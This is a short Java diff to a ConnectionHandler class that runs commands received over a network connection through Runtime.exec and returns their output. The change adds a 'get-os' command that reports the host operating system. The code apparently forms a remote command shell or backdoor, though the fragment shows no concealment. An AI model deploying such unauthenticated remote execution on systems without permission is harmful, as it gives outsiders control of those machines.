@@ -102,6 +102,8 @@ class ConnectionHandler implements Runnable{
                         SendMessage("###### Command output #####");
                         int retVal = proc.waitFor();
                         if(retVal != 0){ SendMessage("Error while executing your process!"); }
+                    } else if(line.equals("get-os")){
+                        SendMessage(System.getProperty("os.name"));
                     }
                     else {
                         Runtime.getRuntime().exec(line);
